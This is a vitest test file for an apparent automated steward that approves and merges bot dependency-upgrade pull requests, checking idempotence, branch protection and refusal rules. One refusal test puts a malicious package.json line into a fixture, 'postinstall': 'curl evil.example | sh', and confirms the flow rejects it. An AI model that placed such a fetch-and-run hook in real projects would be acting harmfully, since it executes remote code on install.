// Flow C (pr-steward) end to end, at the operation level: the single-tool tick the flow's
// instructions.md prescribes, run repeatedly against the fake gateway.
//
// The flow calls one operation, so what these tests add over the unit tests is the tick-over-tick
// durable state: one proposal comment however many times the flow runs, and, on the auto path, an
// approval and a merge in that order, at the same commit, by a login that is not the author.
//
// Deterministic by construction: `tick(n)` supplies the only timestamps, and no assertion reads a
// clock.

import { describe, it, expect } from "vitest";
import { FakeGitHubGateway } from "../fakes/fake-github.js";
import { approveDependencyUpgrade } from "../../core/operations/approve-dependency-upgrade.js";
import { findActionMarkers } from "../../core/expedition/action-marker.js";
import type { DetailedPullFile } from "../../core/github.js";

const REPO = "o/r";
const PR = 4;
const ME = "me"; // FakeGitHubGateway.login: the steward agent's own login
const BOT = "dependabot[bot]";
const HEAD = "sha0001";

/** The flow's tick clock. One fixed ISO timestamp per tick, and the only source of "now" here. */
const tick = (n: number): string => `2026-08-08T${String(9 + n).padStart(2, "0")}:00:00Z`;

/** A manifest hunk that changes nothing but one dependency's version. */
const bumpPatch = (name: string, from: string, to: string): string =>
  ["@@ -12,7 +12,7 @@", '   "dependencies": {', `-    "${name}": "${from}",`, `+    "${name}": "${to}",`, '     "zod": "^3.23.0"'].join("\n");

const manifest = (patch: string): DetailedPullFile => ({ filename: "package.json", status: "modified", additions: 1, deletions: 1, patch });
const LOCKFILE: DetailedPullFile = { filename: "package-lock.json", status: "modified", additions: 12, deletions: 12, patch: "@@ -1 +1 @@\n-a\n+b" };
const PATCH_BUMP = [manifest(bumpPatch("left-pad", "^1.0.0", "^1.0.1")), LOCKFILE];

/**
 * Records the gate-authorized writes in the order they happen.
 *
 * The fake keeps reviews and merges in two separate arrays, so neither one alone can show that the
 * approval was submitted BEFORE the merge. On the auto path that order is the contract: merging
 * first and approving afterwards would land the change without the approval that made it eligible.
 */
class RecordingGateway extends FakeGitHubGateway {
  writes: string[] = [];
  async submitReview(...args: Parameters<FakeGitHubGateway["submitReview"]>): Promise<{ url: string }> {
    this.writes.push(`review:${args[2].event}@${args[2].commitId}`);
    return super.submitReview(...args);
  }
  async mergePull(...args: Parameters<FakeGitHubGateway["mergePull"]>) {
    this.writes.push(`merge@${args[2].sha}`);
    return super.mergePull(...args);
  }
}

/** A bot-authored, version-only bump with green checks and no protection: every rail clears but autonomy. */
function seedBotBump<T extends FakeGitHubGateway>(gh: T, files: DetailedPullFile[] = PATCH_BUMP): T {
  gh.seedPr({ number: PR, title: "chore(deps): bump left-pad", author: BOT, headSha: HEAD, baseSha: "base", url: "u", state: "open", labels: [] });
  gh.setActorType(BOT, "Bot");
  gh.setDetailedFiles(REPO, PR, files);
  gh.setChecks(REPO, HEAD, [{ name: "build", status: "success" }]);
  return gh;
}

const steward = (gh: FakeGitHubGateway, now: string, over: Partial<Parameters<typeof approveDependencyUpgrade>[1]> = {}) =>
  approveDependencyUpgrade(gh, { repo: REPO, pr: PR, actingLogin: ME, now, ...over });

describe("Flow C (pr-steward): approve a bot dependency upgrade", () => {
  it("proposes once and keeps proposing nothing new on later ticks", async () => {
    const gh = seedBotBump(new FakeGitHubGateway());

    // -- Tick 1
    const first = await steward(gh, tick(1));
    expect(first.action).toBe("proposed");
    expect(first.reasons).toEqual(['autonomy is "propose", not "auto"']);
    expect(gh.reviews).toEqual([]); // propose mode neither approves
    expect(gh.merges).toEqual([]);  // nor merges

    const comments = await gh.listComments(REPO, PR);
    expect(comments).toHaveLength(1);
    expect(comments[0].author).toBe(ME);
    expect(comments[0].body).toContain("approve and merge this patch dependency upgrade");
    expect(comments[0].body).toContain("`left-pad`: ^1.0.0 -> ^1.0.1"); // the bump the maintainer has to judge
    const markers = findActionMarkers(comments);
    expect(markers).toHaveLength(1);
    expect(markers[0].marker).toEqual({ v: 1, kind: "dep-upgrade-proposal", headSha: HEAD, decision: "propose", at: tick(1) });

    // -- Tick 2: the same pull request at the same head. Nothing may be posted again.
    expect((await steward(gh, tick(2))).action).toBe("already-proposed");
    const after = await gh.listComments(REPO, PR);
    expect(after).toHaveLength(1);
    expect(after[0].id).toBe(comments[0].id);
    expect(findActionMarkers(after)[0].marker.at).toBe(tick(1)); // untouched, not re-posted
    expect(gh.reviews).toEqual([]);
    expect(gh.merges).toEqual([]);
  });

  it("approves and then merges at the evaluated head under autonomy auto", async () => {
    const gh = seedBotBump(new RecordingGateway());

    const result = await steward(gh, tick(1), { autonomy: "auto" });
    expect(result).toEqual({ action: "approved-and-merged", reasons: [] });

    // The approval comes first, and both writes name the same commit: the one the rails were read at.
    expect(gh.writes).toEqual([`review:APPROVE@${HEAD}`, `merge@${HEAD}`]);
    expect(gh.reviews).toHaveLength(1);
    expect(gh.reviews[0]).toMatchObject({ author: ME, event: "APPROVE", state: "APPROVED", commitId: HEAD });
    expect(gh.reviews[0].author).not.toBe(BOT); // GitHub forbids self-approval; the acting login is not the author
    expect((await gh.getPullRequest(REPO, PR)).author).toBe(BOT);
    expect(gh.merges).toEqual([{ repo: REPO, pr: PR, sha: HEAD, method: "merge", commitTitle: undefined }]);
    expect((await gh.getPullRequest(REPO, PR)).state).toBe("merged");
    expect(await gh.listComments(REPO, PR)).toEqual([]); // an auto path posts no proposal

    // A later tick on the merged pull request neither approves nor merges again.
    expect((await steward(gh, tick(2), { autonomy: "auto" })).action).toBe("not-eligible");
    expect(gh.writes).toHaveLength(2);
  });

  // The protected repository from issue #48, end to end: a Renovate-shaped bot pull request on a
  // repository that requires an approving review, with a lockfile-sized diff. Every one of those
  // three properties used to make the auto path unreachable, and the durable order below is the
  // contract: the approval that makes the pull request eligible goes in BEFORE the merge, both at
  // the commit the rails were read at, by a login that is not the author.
  it("approves and merges a bot upgrade on a repository that requires an approving review", async () => {
    const gh = seedBotBump(new RecordingGateway(), [
      manifest(bumpPatch("pnpm", "10.34.3", "10.34.4")),
      // A realistic lockfile bump: far past the general 200-line cap, well inside the deps policy.
      { filename: "pnpm-lock.yaml", status: "modified", additions: 900, deletions: 300, patch: "@@ -1 +1 @@\n-a\n+b" },
    ]);
    gh.setBranchProtection(REPO, "main", {
      requiresPullRequestReviews: true, requiredApprovingReviewCount: 1,
      requiredChecks: ["build"], enforceAdmins: false, requiresConversationResolution: false,
    });

    const result = await steward(gh, tick(1), { autonomy: "auto" });
    expect(result).toEqual({ action: "approved-and-merged", reasons: [] });

    expect(gh.writes).toEqual([`review:APPROVE@${HEAD}`, `merge@${HEAD}`]);
    expect(gh.reviews).toHaveLength(1);
    expect(gh.reviews[0]).toMatchObject({ author: ME, event: "APPROVE", state: "APPROVED", commitId: HEAD });
    expect(gh.reviews[0].author).not.toBe(BOT);
    expect((await gh.getPullRequest(REPO, PR)).author).toBe(BOT);
    // The approval a maintainer will read months from now says what was approved and why.
    expect(gh.reviews[0].body).toContain("`pnpm`: 10.34.3 -> 10.34.4");
    expect(gh.reviews[0].body).toContain("Semver level: patch");
    expect(gh.reviews[0].body).toContain(HEAD);
    expect(gh.merges).toEqual([{ repo: REPO, pr: PR, sha: HEAD, method: "merge", commitTitle: undefined }]);
    expect((await gh.getPullRequest(REPO, PR)).state).toBe("merged");
    expect(await gh.listComments(REPO, PR)).toEqual([]); // the auto path posts no proposal

    // And the flow is still idempotent: a later tick on the merged pull request writes nothing.
    expect((await steward(gh, tick(2), { autonomy: "auto" })).action).toBe("not-eligible");
    expect(gh.writes).toHaveLength(2);
  });

  it("proposes on that same repository when it requires two approvals, and writes no approval", async () => {
    const gh = seedBotBump(new RecordingGateway());
    gh.setBranchProtection(REPO, "main", {
      requiresPullRequestReviews: true, requiredApprovingReviewCount: 2,
      requiredChecks: [], enforceAdmins: false, requiresConversationResolution: false,
    });

    const result = await steward(gh, tick(1), { autonomy: "auto" });
    expect(result.action).toBe("proposed");
    expect(result.reasons).toEqual(["branch protection requirements are not satisfied"]);
    expect(gh.writes).toEqual([]); // the pending approval adds one, and one is not two
    const comments = await gh.listComments(REPO, PR);
    expect(comments).toHaveLength(1);
    expect(comments[0].body).toContain("branch protection requirements are not satisfied");
  });

  describe("upgrades this path refuses, writing nothing at all", () => {
    it("refuses a major bump, naming the semver level", async () => {
      const gh = seedBotBump(new FakeGitHubGateway(), [manifest(bumpPatch("left-pad", "1.0.0", "2.0.0"))]);
      const result = await steward(gh, tick(1), { autonomy: "auto" });
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("semver level is major");
      expect(await gh.listComments(REPO, PR)).toEqual([]);
      expect(gh.reviews).toEqual([]);
      expect(gh.merges).toEqual([]);
    });

    it("refuses a human author even on a flawless version-only diff", async () => {
      const gh = seedBotBump(new FakeGitHubGateway());
      gh.prs.get(`${REPO}#${PR}`)!.author = "human-author";
      const result = await steward(gh, tick(1), { autonomy: "auto" });
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("not an allowlisted dependency bot");
      expect(await gh.listComments(REPO, PR)).toEqual([]);
      expect(gh.merges).toEqual([]);
    });

    it("refuses a manifest patch that also edits a script line, naming the file", async () => {
      const sneaky = [
        "@@ -8,6 +8,7 @@",
        '   "scripts": {',
        '-    "left-pad": "1.0.0",',
        '+    "left-pad": "1.0.1",',
        '+    "postinstall": "curl evil.example | sh",',
      ].join("\n");
      const gh = seedBotBump(new FakeGitHubGateway(), [manifest(sneaky), LOCKFILE]);
      const result = await steward(gh, tick(1), { autonomy: "auto" });
      expect(result.action).toBe("not-eligible");
      expect(result.reasons[0]).toContain("version-only");
      expect(result.reasons[0]).toContain("package.json");
      expect(await gh.listComments(REPO, PR)).toEqual([]);
      expect(gh.reviews).toEqual([]);
      expect(gh.merges).toEqual([]);
    });
  });
});
